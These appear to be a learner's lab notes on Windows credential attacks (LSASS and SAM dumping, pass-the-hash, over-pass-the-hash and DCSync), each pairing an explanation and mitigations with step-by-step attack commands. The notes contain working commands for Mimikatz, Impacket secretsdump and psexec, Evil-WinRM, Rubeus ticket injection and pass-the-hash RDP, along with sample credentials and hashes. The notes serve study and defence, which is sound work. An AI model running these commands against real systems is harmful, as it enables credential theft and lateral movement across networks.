# Credential Dumping (LSASS & SAM)

## 1. Normal Behavior (How it works normally)
Windows needs to handle user passwords efficiently so you don't have to type your password every 5 minutes.

* **LSASS.exe (Local Security Authority Subsystem Service):** When you log in, this process verifies your password. Crucially, it **keeps your credentials in memory** (RAM) to allow "Single Sign-On" (SSO). This lets you access network shares or printers without re-authenticating.
* **SAM File (Security Account Manager):** This is a database file on the hard drive (`C:\Windows\System32\config\SAM`) that stores **Local User** passwords (as NTLM hashes). It is locked and encrypted by the `SYSTEM` file while Windows is running.
## 2. The Exploit (Where is the weakness?)
The weakness is that **Administrators** (by default) have the right to inspect any program running on the computer, including system processes like LSASS.

* **The Privilege:** There is a specific permission called `SeDebugPrivilege`. It is meant for programmers to "debug" crashing apps.
* **The Attack:** Attackers use this permission to "open" the LSASS process and read its memory, just like reading a text file.
* **The Loot:** Inside that memory, they find:
    * **Plaintext Passwords** (if WDigest is enabled).
    * **NTLM Hashes** (for Pass-the-Hash).
    * **Kerberos Tickets** (for Pass-the-Ticket).
## 3. Attack Execution (Step-by-Step)

**The Tool:** **Mimikatz**. It is the king of credential dumping.

**Requirements:** You must be running as **Administrator** or **SYSTEM**.

**Commands:**


```
impacket-secretsdump 'spookysec.local/backup:backup2517860@10.80.173.90' -dc-ip 10.80.173.90

```

1.  **Start Mimikatz:**
    ```cmd
    mimikatz.exe
    ```

2.  **Get Debug Rights:**
    Enable the privilege to touch protected processes.
    ```cmd
    privilege::debug
    ```
    * *Output:* `Privilege '20' OK` (This means you are now powerful enough).

3.  **Elevate to SYSTEM (Optional but recommended):**
    Impersonate the system token to have ultimate control.
    ```cmd
    token::elevate
    ```

4.  **Dump LSASS (Memory):**
    This pulls passwords and hashes from the running RAM.
    ```cmd
    sekurlsa::logonpasswords
    ```
    * *Look for:* Sections like `msv` (Hashes) or `wdigest` / `tspkg` (sometimes Cleartext).

![[Pasted image 20260110001808.png]]

5.  **Dump SAM (Local Disk):**
    This pulls the hashes of local users (like the local Administrator) from the registry.
    ```cmd
    lsadump::sam
    ```
    * *Note:* This does not give you Domain User passwords, only accounts created locally on that specific PC.

![[Pasted image 20260110001706.png]]
## 4. Mitigation (How to fix it)

### A. LSA Protection (RunAsPPL)
You can tell Windows to mark LSASS as a "Protected Process Light" (PPL). This stops non-Microsoft tools (like Mimikatz) from reading its memory, even if they are Admin.
* **Registry Key:**
    `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`
    Set `RunAsPPL` to `1`.
### B. Credential Guard (The Best Fix)
This uses **Virtualization (Hyper-V)** to isolate the LSASS process in a separate "virtual container". Even if the attacker is fully Administrator on the main OS, they cannot reach the memory inside the virtual container.
### C. Disable WDigest
Ensure Windows does not store plaintext passwords in memory. (Enabled by default in modern Windows, but check this registry key):
* `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`
* Set `UseLogonCredential` to `0`.

# Pass the Hash (PtH) & Over-Pass the Hash

## 1. Normal Behavior (How it works normally)
* **Password Authentication:** Typically, when you log in, Windows takes your cleartext password, hashes it, and compares it.
* **SSO:** Once authenticated, Windows keeps the "secrets" (Hashes or Tickets) in memory (LSASS) so you can access resources without typing the password again.
* **Remote Access:** Protocols like SMB, RDP, and WinRM usually check these credentials against the DC or local SAM.
## 2. The Exploit (Where is the weakness?)
The weakness is that the **Windows Challenge/Response protocols (NTLM)** do not actually send the password across the network. They use the **Hash** to prove identity.

* **The Concept:** If you steal the Hash (from the previous Mimikatz/Dumping attack), the server cannot distinguish between "User typing a password" and "Hacker injecting the hash".
* **Over-Pass the Hash:** This is a specific variation where we use the stolen NTLM Hash to request a full **Kerberos TGT**. This allows us to use Kerberos tools (like PTT) instead of just NTLM.
## 3. Attack Execution (Step-by-Step)

We have the hash `2777b7fec870e04dda00cd7260f7bee6`. Now we use it.

### A. Validation (Check if hash works)
Before attacking, verify the hash is valid for the target machine.
```bash
nxc smb 10.80.165.187 -u 'administrator' -H '2777b7fec870e04dda00cd7260f7bee6'
```
### B. Lateral Movement (Getting a Shell)

**Method 1: SMB (Psexec)** - Classic method.
```bash
impacket-psexec 'child/child-admin@10.10.10.2' -hashes :dbac2b57a73bb883422658d2aea36967
```

**Method 2: WinRM (Evil-WinRM)** - Cleaner, usually caught less by antivirus.

- _Requirement:_ User must be in "Remote Management Users" or "Administrators" group.
```bash
evil-winrm -i 10.80.165.187 -u Administrator -H 2777b7fec870e04dda00cd7260f7bee6
```
![[Pasted image 20260110002805.jpg]]

### C. RDP with Hash (Restricted Admin Mode)

Normally RDP requires a cleartext password. However, if "Restricted Admin Mode" is enabled, we can use the hash.

**1. Enable the Registry Key (If you already have access):**

```bash
nxc smb 10.80.165.187 -u 'administrator' -H 'HASH' -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

**2. Login via RDP:**
```bash
xfreerdp3 /u:administrator /pth:'2777b7fec870e04dda00cd7260f7bee6' /d:controller.local /v:10.80.174.72 /dynamic-resolution
```

### D. Over-Pass the Hash (The "Rubeus" Way)

Here, we turn the Hash into a Ticket (TGT) and inject it into our current session.
```powershell
Rubeus.exe asktgt /user:ahmed.emad /rc4:F0A05D8050AC628A63725BD2A518167C /domain:controller.local /nowrap /ptt
```
- `/rc4`: This is the NTLM Hash.
- `/ptt`: "Pass The Ticket" - automatically injects it into memory.
- _Result:_ Now you can access resources as `ahmed.emad` without typing a password.
![[Pasted image 20260110003325.jpg]]

![[Pasted image 20260110003333.jpg]]

## 4. Enumeration & Discovery (Who can I hack?)

You mentioned checking the "Remote Management Users" group. This is smart to identify targets for WinRM.

**PowerShell Commands (on a compromised machine):**

1. **Find the Group:**
    ```
    Get-ADGroup -Filter 'Name -like "*Remote*"'
   ```
2. **List Members:**
    ```
    Get-ADGroupMember -Identity "Remote Management Users"
    ```
    
3. **Hunter Mode (Find where they logged in):** If you compromise a user, check logs to see where else they exist.
    
    PowerShell
    
    ```
    Get-EventLog -LogName Security -InstanceId 4624 | Where-Object {$_.Message -like "*ahmed.emad*"}
    ```
## 5. Mitigation (How to fix it)

1. **Disable NTLM:** If you fully disable NTLM in the domain, standard "Pass the Hash" stops working (but Over-Pass the Hash might still work via Kerberos).
    
2. **LAPS (Local Admin Password Solution):** Ensures every computer has a different local admin password. This stops you from using one hash to jump to all other computers.
    
3. **Protected Users Group:** Add sensitive admins to the "Protected Users" AD group.
    
    - It forces Kerberos (no NTLM).
        
    - It prevents caching of plain text credentials.
        
    - It prevents generic "Pass the Hash" attacks.

# NTDS.dit Dumping (DCSync Attack)

## 1. Normal Behavior (How it works normally)
* **NTDS.dit:** This is the main database file of Active Directory. It is stored on every Domain Controller (usually `C:\Windows\NTDS\ntds.dit`). It contains **everything**: Users, Computers, Groups, and most importantly, **Password Hashes**.
* **Replication (DCSync):** In a large network, companies have multiple Domain Controllers (e.g., one in Cairo, one in London). These DCs must sync with each other to share new users or password changes. They use a specific protocol called **MS-DRSR** (Directory Replication Service Remote Protocol) to ask each other: *"Hey, give me the latest password updates."*

## 2. The Exploit (Where is the weakness?)
The weakness is not in the file itself, but in the **Permission to Replicate**.

* **The Concept:** An attacker does not need to log in to the DC physically to copy the file (which is locked anyway). Instead, the attacker **pretends to be another Domain Controller**.
* **The Permission:** If a user has the "Replicating Directory Changes All" permission (usually Domain Admins or sometimes accidentally given to service accounts), they can send a request to the DC saying: *"I am a fellow DC, please send me all the user hashes."*
* **The Result:** The DC politely sends every single credential over the network to the attacker.

## 3. Attack Execution (Step-by-Step)

You provided two methods. Both achieve the same goal but from different places.

### Method A: Remote Dumping (Impacket)
Used when you are on a Linux machine (e.g., Kali) and have compromised a Domain Admin's credentials (or hash).

**Command:**
```bash
impacket-secretsdump contorller.local/ahmed.emad@10.80.174.72 -hashes :A3AB2DDD1DB577A8423BFB9CB6F87A20
```

![[Pasted image 20260108203233.png]]
### Method B: Local/Windows Execution (Mimikatz)

Used when you are already inside a Windows machine joined to the domain.

**Command:**

DOS

```
lsadump::dcsync /user:controller\administrator /domain:controller.local
```

**Command Breakdown:**

- `lsadump::dcsync`: Tells Mimikatz to simulate the replication protocol.
    
- `/user`: Specifically asks for the hash of the Administrator account (you can ask for `/all` too).
    
- `/domain`: The domain you are targeting.
    

![[Pasted image 20260110003730.jpg]]
## 4. Mitigation (How to fix it)

This attack relies on specific permissions (ACLs) on the Domain Object.

1. **Check Permissions:** Open `ADSI Edit` or `Active Directory Users and Computers` (Advanced Features).
    
2. **Inspect Root Domain:** Right-click the domain > Properties > Security.
    
3. **Audit:** Look for "Replicating Directory Changes All". Ensure **ONLY** "Domain Controllers" and "Exchange Servers" have this. Remove any regular users or service accounts from this list.